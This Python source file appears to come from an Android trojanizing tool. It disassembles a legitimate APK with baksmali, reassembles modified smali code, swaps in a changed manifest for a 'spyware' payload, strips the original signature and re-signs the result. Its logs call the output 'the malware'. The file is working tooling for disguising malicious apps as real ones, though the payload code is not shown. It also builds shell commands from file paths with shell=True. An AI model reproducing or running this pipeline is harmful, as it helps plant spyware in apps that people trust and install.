#!/usr/bin/env python
#    Copyright (C) 2015 Alexandre Teyar

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
#    limitations under the License.

import logging
import os
import subprocess
import re
import shutil
import sys
import zipfile

from utils import config, file_operation


# TODO: Improve the returned output formatting - replace . with / and
# add .smali
def get_main_activity(app_path):
    """
    Returns the main activity from the AndroidManifest.xml.
    """
    try:
        instruction = (
            "aapt dump badging {0}".format(app_path)
        )
        logging.debug("{}".format(instruction))
        output = subprocess.check_output(
            instruction,
            shell=True).decode("UTF-8")

        regex = re.compile("launchable-activity:.*")
        result = regex.search(output).group(0)

    except subprocess.CalledProcessError as ex:
        logging.critical("{} - {}".format(ex.returncode, ex.output.decode()))
        sys.exit(1)

    return result


def disassemble(payload):
    if not os.path.exists(config.TMP_FOLDER):
        os.makedirs(config.TMP_FOLDER)

    try:
        logging.info("disassemble the application into the 'tmp' folder")
        instruction = (
            "java -jar ../libs/baksmali-2.2.1.jar disassemble "
            "--parameter-registers false -o {} {}".format(
                os.path.join(config.TMP_FOLDER, payload.app_name),
                payload.app_path)
        )
        logging.debug("{}".format(instruction))
        subprocess.check_output(instruction, shell=True)

        # Create a copy of the legitimate app disassembled code
        if config.DEBUG_MODE == 1:
            if not os.path.exists(config.TMP_FOLDER):
                os.makedirs(config.TMP_FOLDER)

            logging.info("save a copy of the legitimate disassembled source code into the 'debug' folder")
            file_operation.copy(
                os.path.join(config.TMP_FOLDER, payload.app_name),
                os.path.join(config.DEBUG_FOLDER, payload.app_name))

    except subprocess.CalledProcessError as ex:
        logging.critical("{} - {}".format(ex.returncode, ex.output.decode()))
        sys.exit(1)


def reassemble(payload):
    # Create a copy of the infected app source code
    if config.DEBUG_MODE == 1:
        logging.info("save a copy of the modified disassembled source code into the 'debug' folder")
        file_operation.copy(os.path.join(config.TMP_FOLDER, payload.app_name),
                            os.path.join(
                                config.DEBUG_FOLDER, payload.app_name +
                                "_malware"))
    try:
        # Assemble the modified smali files into classes.dex
        logging.info("assemble the modified smali files into 'classes.dex'")
        instruction = (
            "java -jar ../libs/smali-2.2.1.jar assemble "
            "{} -o {}".format(
                os.path.join(config.TMP_FOLDER, payload.app_name),
                os.path.join(config.TMP_FOLDER, "classes.dex"))
        )
        logging.debug("{}".format(instruction))
        subprocess.check_output(instruction, shell=True)

        # Create a copy of the app - insert classes.dex, remove
        # the cert and re-sign
        logging.info("create a copy of the legitimate app in the 'tmp' folder")
        file_operation.copy(payload.app_path,
                            os.path.join(
                                config.TMP_FOLDER, payload.app_name + ".apk"))

        if (payload.payload_name == "spyware"):
            file_names = [
                "AndroidManifest.xml",
                "classes.dex",
                "META-INF/CERT.RSA",
                "META-INF/CERT.SF"
            ]

        else:
            file_names = [
                "classes.dex",
                "META-INF/CERT.RSA",
                "META-INF/CERT.SF"
            ]

        logging.info("remove {} from the application".format(file_names))
        file_operation.remove_from_zip(
            os.path.join(
                config.TMP_FOLDER, payload.app_name + ".apk"), file_names)

        zin = zipfile.ZipFile(os.path.join(
            config.TMP_FOLDER, payload.app_name + ".apk"), 'a')

        if (payload.payload_name == "spyware"):
            logging.info("insert 'classes.dex' and 'AndroidManifest.xml' into the application")
            zin.write(os.path.join(
                config.TMP_FOLDER, "classes.dex"), "classes.dex")

            AndroidManifest = payload.get_updated_AndroidManifest()
            zin.write(AndroidManifest, "AndroidManifest.xml")

        else:
            logging.info("insert 'classes.dex' into the application")
            zin.write(os.path.join(
                config.TMP_FOLDER, "classes.dex"), "classes.dex")

    except subprocess.CalledProcessError as ex:
        logging.critical("{} - {}".format(ex.returncode, ex.output.decode()))
        sys.exit(1)

    except (zipfile.BadZipfile, zipfile.LargeZipFile) as ex:
        logging.critical("{}".format(ex))
        sys.exit(1)


def sign(payload):
    try:
        # Sign the new apk with the certificate within certs/
        # make sure that the Java JDK is in the environement path
        logging.info("signing the malware")
        instruction = (
            "jarsigner -verbose -sigalg SHA1withRSA "
            "-digestalg SHA1 -keystore {} "
            "-storepass password {} alias_name".format(
                config.CERT, os.path.join(
                    config.TMP_FOLDER, payload.app_name + ".apk"))
        )
        logging.debug("{}".format(instruction))
        subprocess.check_output(instruction, shell=True)

        # Move the malware app to the MALWARE_FOLDER and remove the TMP_FOLDER
        logging.info("moving the created malware to the 'malware' folder")
        if not os.path.exists(config.MALWARE_FOLDER):
            os.makedirs(config.MALWARE_FOLDER)

        file_operation.copy(
            os.path.join(config.TMP_FOLDER, payload.app_name + ".apk"),
            os.path.join(config.MALWARE_FOLDER, payload.app_name + ".apk"))

        logging.info("remove the 'tmp' folder")
        shutil.rmtree(config.TMP_FOLDER, ignore_errors=True)

    except subprocess.CalledProcessError as ex:
        logging.critical("{} - {}".format(ex.returncode, ex.output.decode()))
        sys.exit(1)
